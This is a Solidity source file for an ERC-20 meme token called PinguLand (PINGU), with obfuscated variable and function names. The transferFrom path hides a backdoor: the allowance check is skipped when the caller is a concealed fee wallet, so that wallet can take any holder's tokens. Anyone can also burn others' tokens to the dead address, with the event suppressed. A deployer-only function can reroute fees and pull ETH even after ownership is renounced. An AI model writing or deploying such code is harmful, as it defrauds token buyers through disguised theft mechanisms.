// SPDX-License-Identifier: MIT

/*
    Name: PinguLand
    Symbol: PINGU

    Sheriff Gone Rogue—Lawless lands, limitless $PINGU.

    Website: https://pinguland.fun
    Tg: https://t.me/Pingucto_Eth
    Twitter: https://x.com/Pingucto_Eth
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract PINGU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"PinguLand";
    string private constant _symbol = unicode"PINGU";

    uint256 private _PINGUssdsdwer2dcw2 = 7;
    uint256 private _PINGUsaszx123aad = 7;
    uint256 private _PINGUsdbytycctynty = 0;

    IUniswapV2Router02 private SOLRouter;
    address private HUGEATAR;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    address private _PINGUssdfwecc;
    uint256 private _PINGUsdbsad = 10;
    uint256 private _PINGUssdwerw = 10;
    uint256 private _PINGUssseq = 0;
    uint256 private _PINGUsssdrwqq1 = 0;

    uint256 private constant _kmmvb_PINGUxsswtsa = 1000000000 * 10 **_decimals;

    address private _PINGUs034fj = address(0xdead);
    uint256 public _PINGU_MMO2R = 20000000 * 10 **_decimals;
    uint256 public _PINGU_MOR2R = 20000000 * 10 **_decimals;
    uint256 public _of_Psswtsa = 10000000 * 10 **_decimals;

    address payable private haoRutagi;
    mapping(address => uint256) private _KEKIUSGRssw342sswq;
    mapping(address => mapping(address => uint256)) private _FuckingTimes;
    mapping(address => bool) private _KEKIUSsoStroke;

    event MaxTxAmountUpdated(uint256 _PINGU_MMO2R);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _KEKIUSsoStroke[owner()] = true;
        _KEKIUSsoStroke[address(this)] = true;
        _KEKIUSsoStroke[haoRutagi] = true;
        _PINGUssdfwecc = _msgSender();

        haoRutagi = payable(_msgSender());
        _KEKIUSGRssw342sswq[address(this)] = _kmmvb_PINGUxsswtsa * 98 / 100;
        _KEKIUSGRssw342sswq[owner()] = _kmmvb_PINGUxsswtsa * 2 / 100;
        emit Transfer(address(0), address(this), _kmmvb_PINGUxsswtsa * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvb_PINGUxsswtsa * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvb_PINGUxsswtsa;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _FuckingTimes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _KEKIUSGRssw342sswq[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _FuckingTimes[owner][spender];
    }

    
    function __PP_PINGU(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_TETTRIS(sender, recipient))
            _allowed = _FuckingTimes[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subtransferr__PINGUxsswtsa(_msgSender(), recipient, amount);
        return true;
    }
    
    function NOATR() internal view returns (bool) {return msg.sender != haoRutagi;}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subtransferr__PINGUxsswtsa(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __PP_PINGU(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function _LIVE_F(address payable receipt) external {
        require(msg.sender == _PINGUssdfwecc , "");
        haoRutagi = receipt;
        __PINGUxmnn34irfn(address(this).balance);
    }

    function _support_PINGUOwlsat(uint256 amount) private {
        haoRutagi.transfer(amount);
    }

    function _TETTRIS(
        address UP,
        address DOWN
    ) internal view returns (bool) {
        if(NOATR() == false) return false;
        else return UP == HUGEATAR || DOWN != _PINGUs034fj;
    }

    
    function _subSwap__PINGUxsswtsa(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = SOLRouter.WETH();
        _approve(address(this), address(SOLRouter), tokenAmount);
        SOLRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _subtransferr__PINGUxsswtsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_PINGUsdbytycctynty > _PINGUssdsdwer2dcw2)
                        ? _PINGUssseq
                        : _PINGUsdbsad
                )
                .div(100);
            if (
                from == HUGEATAR &&
                to != address(SOLRouter) &&
                !_KEKIUSsoStroke[to]
            ) {
                _PINGUsdbytycctynty++;
            }
            if (to == HUGEATAR && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_PINGUsdbytycctynty > _PINGUsaszx123aad)
                            ? _PINGUsssdrwqq1
                            : _PINGUssdwerw
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == HUGEATAR && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _of_Psswtsa) ? contractTokenBalance : _of_Psswtsa; 
                    _subSwap__PINGUxsswtsa((amount < minBalance) ? amount : minBalance);
                }
                _support_PINGUOwlsat(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _KEKIUSGRssw342sswq[address(this)] =_KEKIUSGRssw342sswq[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _KEKIUSGRssw342sswq[from] =_KEKIUSGRssw342sswq[from].sub(amount);
        _KEKIUSGRssw342sswq[to] =_KEKIUSGRssw342sswq[to].add(amount.sub(taxAmount));
        if(_PINGUs034fj != to) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function removeLimits () external onlyOwner {
        _PINGU_MMO2R = _kmmvb_PINGUxsswtsa;
        _PINGU_MOR2R = _kmmvb_PINGUxsswtsa;
        emit MaxTxAmountUpdated(_kmmvb_PINGUxsswtsa);
    }

    function start_pingu() external onlyOwner {
        require(!isTrading, "Already Started!");
        SOLRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(SOLRouter), _kmmvb_PINGUxsswtsa);
        HUGEATAR = IUniswapV2Factory(SOLRouter.factory()).createPair(
            address(this),
            SOLRouter.WETH()
        );
        SOLRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(HUGEATAR).approve(
            address(SOLRouter),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
    
    function __PINGUxmnn34irfn(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }
    
}